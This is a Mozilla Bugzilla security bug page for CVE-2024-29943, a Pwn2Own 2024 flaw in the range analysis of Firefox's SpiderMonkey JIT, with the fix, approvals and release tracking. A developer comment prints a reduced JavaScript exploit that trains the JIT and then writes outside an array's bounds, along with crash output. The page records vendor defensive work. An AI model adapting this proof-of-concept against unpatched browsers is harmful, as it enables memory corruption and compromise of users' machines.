

![](/static/v20250108.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1886849)
* [XML](/show_bug.cgi?ctype=xml&id=1886849)

Closed
[Bug 1886849](/show_bug.cgi?id=1886849)
(CVE-2024-29943)

Opened 10 months ago
Closed 10 months ago

# [pwn2own-2024] MObjectKeysLength::computeRange is incorrect

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

[pwn2own-2024] MObjectKeysLength::computeRange is incorrect

## Categories

### (Core :: JavaScript Engine: JIT, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=JavaScript%20Engine%3A%20JIT#JavaScript%20Engine%3A%20JIT)

JavaScript Engine: JIT
▾

Core :: JavaScript Engine: JIT
JavaScript engine's JIT compilers
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=JavaScript%20Engine%3A%20JIT&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=JavaScript%20Engine%3A%20JIT&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=JavaScript%20Engine%3A%20JIT)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

--

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

126 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| a11y-review | --- |
| --- | --- |
| Accessibility Severity | --- |
| Performance Impact | --- |
| Webcompat Score | --- |
| Webcompat Priority | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr115 | --- | [unaffected](/buglist.cgi?f1=cf_status_firefox_esr115&o1=equals&v1=unaffected) |
| firefox124 | [+](/buglist.cgi?f1=cf_tracking_firefox124&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox124&o1=equals&v1=fixed) |
| firefox125 | [+](/buglist.cgi?f1=cf_tracking_firefox125&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox125&o1=equals&v1=fixed) |
| firefox126 | [+](/buglist.cgi?f1=cf_tracking_firefox126&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox126&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr115 | --- | unaffected |
| firefox-esr128 | --- | --- |
| firefox124 | + | fixed |
| firefox125 | + | fixed |
| firefox126 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: jandem, Assigned: iain)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/1243fc5f2c1c56a2f77ca1be38837e68?d=mm&size=40)  [iain](/user_profile?user_id=623993)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/709c5feed942bf99f098bb24aa1cc86f?d=mm&size=40)  [jandem](/user_profile?user_id=375297)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/4fe52ee1503aecf7b6c976b8eb7c1753?d=mm&size=40)  [willyelm](/user_profile?user_id=714609)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

23 people

## References

### (Blocks 1 open bug, Regression)

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[sm-security](/show_bug.cgi?id=1729513 "NEW - [meta] SpiderMonkey Fuzzing & Instrumentation & Security")

Dependency [tree](/showdependencytree.cgi?id=1886849&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1886849)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

[1845728](/show_bug.cgi?id=1845728 "RESOLVED FIXED - Make Object.keys elidable when only the length property is used.")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (4 keywords, Whiteboard: [adv-main124.0.1+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2024-29943

[Keywords:](/describekeywords.cgi)

[csectype-jit](/buglist.cgi?keywords=csectype-jit&resolution=---),
[regression](/buglist.cgi?keywords=regression&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adv-main124.0.1+]

QA Whiteboard:

[post-critsmash-triage]

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (4 files)

| [Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem](/attachment.cgi?id=9392592)  [10 months ago](#c1)  [Iain Ireland [:iain]](/user_profile?user_id=623993)   48 bytes, text/x-phabricator-request | diannaS : [approval-mozilla-beta+](#c10 "10 months ago")  diannaS : [approval-mozilla-release+](#c12 "10 months ago")  tjr : [sec-approval+](#a3667_578488 "10 months ago") | [Details](/attachment.cgi?id=9392592&action=edit) | [Review](/attachment.cgi?id=9392592) |
| --- | --- | --- |
| [Shell test 1](/attachment.cgi?id=9392597)  [10 months ago](#c2)  [Jan de Mooij [:jandem]](/user_profile?user_id=375297)   399 bytes, text/plain |  | [Details](/attachment.cgi?id=9392597&action=edit) |
| [Shell version of exploit](/attachment.cgi?id=9392603)  [10 months ago](#c4)  [Jan de Mooij [:jandem]](/user_profile?user_id=375297)   24.78 KB, text/plain |  | [Details](/attachment.cgi?id=9392603&action=edit) |
| [advisory.txt](/attachment.cgi?id=9392607)  [10 months ago](#c5)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   236 bytes, text/plain |  | [Details](/attachment.cgi?id=9392607&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Jan de Mooij [:jandem]](/user_profile?user_id=375297)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1886849#c0)• 10 months ago |
|  | |

*No description provided.*

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a70_75935)• 10 months ago |

[status-firefox124](/buglist.cgi?f1=cf_status_firefox124&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox124&o1=equals&v1=affected)
[status-firefox125](/buglist.cgi?f1=cf_status_firefox125&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox125&o1=equals&v1=affected)
[status-firefox126](/buglist.cgi?f1=cf_status_firefox126&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox126&o1=equals&v1=affected)
[status-firefox-esr115](/buglist.cgi?f1=cf_status_firefox_esr115&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_status_firefox_esr115&o1=equals&v1=%3F)
[tracking-firefox124](/buglist.cgi?f1=cf_tracking_firefox124&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox124&o1=equals&v1=%2B)
[tracking-firefox125](/buglist.cgi?f1=cf_tracking_firefox125&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox125&o1=equals&v1=%2B)
[tracking-firefox126](/buglist.cgi?f1=cf_tracking_firefox126&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox126&o1=equals&v1=%2B)

|  | [Jan de Mooij [:jandem]](/user_profile?user_id=375297)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a85_375297)• 10 months ago |

Type: task → defectKeywords: [regression](/buglist.cgi?keywords=regression&resolution=---)Regressed by: [1845728](/show_bug.cgi?id=1845728 "RESOLVED FIXED - Make Object.keys elidable when only the length property is used.")

|  | [Iain Ireland [:iain]](/user_profile?user_id=623993)  Assignee |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1886849#c1)• 10 months ago |
|  | |

Attached file
[Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem](attachment.cgi?id=9392592)
— [Details](attachment.cgi?id=9392592&action=edit)

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a278_600971)• 10 months ago |

Assignee: nobody → iirelandStatus: NEW → ASSIGNED

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a307_75935)• 10 months ago |

[status-firefox-esr115](/buglist.cgi?f1=cf_status_firefox_esr115&o1=isnotempty):
[?](/buglist.cgi?f1=cf_status_firefox_esr115&o1=equals&v1=%3F) → [unaffected](/buglist.cgi?f1=cf_status_firefox_esr115&o1=equals&v1=unaffected)

|  | [Jan de Mooij [:jandem]](/user_profile?user_id=375297)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1886849#c2)• 10 months ago |
|  | |

Attached file
[Shell test 1](attachment.cgi?id=9392597)
— [Details](attachment.cgi?id=9392597&action=edit)

Initial shell test case. I'm working on a better one that doesn't require this flag.

```
obj-shell-dbgopt/dist/bin/js --no-threads --ion-check-range-analysis test.js
Assertion failure: Integer input should be lower or equal than Upperbound., at mozilla-unified/js/src/jit/VMFunctions.cpp:2978
#01: ??? (???:???)
Trace/breakpoint trap (core dumped)

```

|  | [Iain Ireland [:iain]](/user_profile?user_id=623993)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1886849#c3)• 10 months ago |
|  | |

Comment on [attachment 9392592](/attachment.cgi?id=9392592 "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem") [[details]](/attachment.cgi?id=9392592&action=edit "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem")

[Bug 1886849](/show_bug.cgi?id=1886849 "RESOLVED FIXED - [pwn2own-2024] MObjectKeysLength::computeRange is incorrect"): Remove MObjectKeysLength::computeRange r=jandem

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Medium difficulty. This patch fairly clearly identifies that we got range analysis wrong for MObjectKeysLength, but the writeup makes it clear that getting from that point to an exploit requires some cleverness. I spent some time trying to figure out whether there was an alternative fix that didn't point at range analysis, but I didn't come up with anything reasonable.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which branches (beta, release, and/or ESR) are affected by this flaw, and do the release status flags reflect this affected/unaffected state correctly?**: Beta + Release
* **If not all supported branches, which bug introduced the flaw?**: [Bug 1845728](/show_bug.cgi?id=1845728 "RESOLVED FIXED - Make Object.keys elidable when only the length property is used.")
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: This patch should apply trivially.
* **How likely is this patch to cause regressions; how much testing does it need?**: Extremely unlikely. We are simply deleting code.
* **Is the patch ready to land after security approval is given?**: Yes
* **Is Android affected?**: Yes
[Attachment #9392592](/attachment.cgi?id=9392592&action=edit "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem") -
Flags: sec-approval?

|  | [Jan de Mooij [:jandem]](/user_profile?user_id=375297)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1886849#c4)• 10 months ago |
|  | |

Attached file
[Shell version of exploit](attachment.cgi?id=9392603)
— [Details](attachment.cgi?id=9392603&action=edit)

```
obj-shell-opt/dist/bin/js --no-threads --spectre-mitigations=off ~/dev/test.js
Array built
trained
len1: 512
target2 idx: 15
Segmentation fault (core dumped)

```

As described in the write-up, Spectre index masking has to be disabled for this.

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1886849#c5)• 10 months ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9392607)
— [Details](attachment.cgi?id=9392607&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a3667_578488)• 10 months ago |

[Attachment #9392592](/attachment.cgi?id=9392592&action=edit "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem") -
Flags: sec-approval? → sec-approval+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a7132_578488)• 10 months ago |

Alias: CVE-2024-29943

|  | [Pulsebot](/user_profile?user_id=510726) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1886849#c6)• 10 months ago |
|  | |

Pushed by smolnar@mozilla.com:
<https://hg.mozilla.org/mozilla-central/rev/45d29e78c0d8>
Remove MObjectKeysLength::computeRange r=jandem

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1886849#c7)• 10 months ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/45d29e78c0d8>

Group: javascript-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 10 months ago
[status-firefox126](/buglist.cgi?f1=cf_status_firefox126&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox126&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox126&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → 126 Branch

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a10076_406194)• 10 months ago |

Keywords: [csectype-jit](/buglist.cgi?keywords=csectype-jit&resolution=---)

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a10535_406194)• 10 months ago |

Keywords: [sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

|  | [Iain Ireland [:iain]](/user_profile?user_id=623993)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1886849#c8)• 10 months ago |
|  | |

Comment on [attachment 9392592](/attachment.cgi?id=9392592 "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem") [[details]](/attachment.cgi?id=9392592&action=edit "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem")

[Bug 1886849](/show_bug.cgi?id=1886849 "RESOLVED FIXED - [pwn2own-2024] MObjectKeysLength::computeRange is incorrect"): Remove MObjectKeysLength::computeRange r=jandem

### Beta/Release Uplift Approval Request

* **User impact if declined**: This bug was used as part of an exploit chain at Pwn2Own.
* **Is this code covered by automated tests?**: Yes
* **Has the fix been verified in Nightly?**: Yes
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**: None
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: This patch deletes the code in question. We have verified that it does not affect performance on the code that motivated the original development of this feature.
* **String changes made/needed**: None
* **Is Android affected?**: Yes
[Attachment #9392592](/attachment.cgi?id=9392592&action=edit "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem") -
Flags: approval-mozilla-release?
[Attachment #9392592](/attachment.cgi?id=9392592&action=edit "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem") -
Flags: approval-mozilla-beta?

|  | [Pulsebot](/user_profile?user_id=510726) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1886849#c9)• 10 months ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/8228efc1e07c>

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1886849#c10)• 10 months ago |
|  | |

Comment on [attachment 9392592](/attachment.cgi?id=9392592 "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem") [[details]](/attachment.cgi?id=9392592&action=edit "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem")

[Bug 1886849](/show_bug.cgi?id=1886849 "RESOLVED FIXED - [pwn2own-2024] MObjectKeysLength::computeRange is incorrect"): Remove MObjectKeysLength::computeRange r=jandem

Approved for 125.0b3

[Attachment #9392592](/attachment.cgi?id=9392592&action=edit "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a11489_690067)• 10 months ago |

[status-firefox125](/buglist.cgi?f1=cf_status_firefox125&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox125&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox125&o1=equals&v1=fixed)

|  | [Pulsebot](/user_profile?user_id=510726) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1886849#c11)• 10 months ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-release/rev/83c1d327323c>

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1886849#c12)• 10 months ago |
|  | |

Comment on [attachment 9392592](/attachment.cgi?id=9392592 "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem") [[details]](/attachment.cgi?id=9392592&action=edit "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem")

[Bug 1886849](/show_bug.cgi?id=1886849 "RESOLVED FIXED - [pwn2own-2024] MObjectKeysLength::computeRange is incorrect"): Remove MObjectKeysLength::computeRange r=jandem

Approved for 124.0.1 dot release

[Attachment #9392592](/attachment.cgi?id=9392592&action=edit "Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem") -
Flags: approval-mozilla-release? → approval-mozilla-release+

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a15612_690067)• 10 months ago |

[status-firefox124](/buglist.cgi?f1=cf_status_firefox124&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox124&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox124&o1=equals&v1=fixed)

|  | [Iain Ireland [:iain]](/user_profile?user_id=623993)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1886849#c13)• 10 months ago |
|  | |

Here's a reduced version of the exploit:

```
// |jit-test| --no-threads; --spectre-mitigations=off

function makeArray(n) {
  let arr = new Uint8Array(n);
  arr.a = 5; arr.b = 5; arr.c = 5; arr.d = 5; arr.e = 5; arr.f = 5;
  return arr;
}
function exploit(foo, x) {
  let neg = Object.keys(x).length + 1879048190;
  neg = Math.max(neg, (-72)|0);
  neg = Math.min(neg, 0);
  let idx = 31;

  for (let i = neg; i <= 20; i++) {
    idx -= 1;
    foo[idx+32] = foo[idx];
  }
}

let arr = makeArray(64);
let long_array = makeArray(2**28-4);

let foo = new Uint8Array(64);
for (let i = 0; i < 2000; i++) {
  exploit(foo, arr);
}
exploit(foo, long_array);
assertEq(foo[0], 0);

```

Unfortunately, with the bug fixed, we bail out when the bounds check fails and run out of memory trying to allocate ~2^28 keys in RObjectKeys::recover. I'm not sure if there's any way to write this testcase that doesn't run into that problem.

|  | [Andrei Vaida [:avaida]](/user_profile?user_id=488993) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a558576_488993)• 10 months ago |

QA Whiteboard: [post-critsmash-triage]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a6365961_1689)• 7 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a7718458_1689)• 7 months ago |

Whiteboard: [adv-main124.0.1+]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a8788158_428608)• 6 months ago |

[Attachment #9392597](/attachment.cgi?id=9392597&action=edit "Shell test 1") -
Attachment mime type: application/x-javascript → text/plain

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a8788164_428608)• 6 months ago |

[Attachment #9392603](/attachment.cgi?id=9392603&action=edit "Shell version of exploit") -
Attachment mime type: application/x-javascript → text/plain

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1886849#c14)• 6 months ago |
|  | |

There are various public reports of this bug, due to its notoriety as a pwn2own bug. Any objections to making this public?

Flags: needinfo?(dveditz)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a8949382_1689)• 6 months ago |

Group: core-security-releaseFlags: needinfo?(dveditz)

|  | [Nicolas B. Pierron [:nbp]](/user_profile?user_id=422187) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1886849#a8972407_422187)• 6 months ago |

Blocks: [sm-security](/show_bug.cgi?id=1729513 "NEW - [meta] SpiderMonkey Fuzzing & Instrumentation & Security")
You need to [log in](/show_bug.cgi?id=1886849&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Iain Ireland [:iain]](/user_profile?user_id=623993)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review

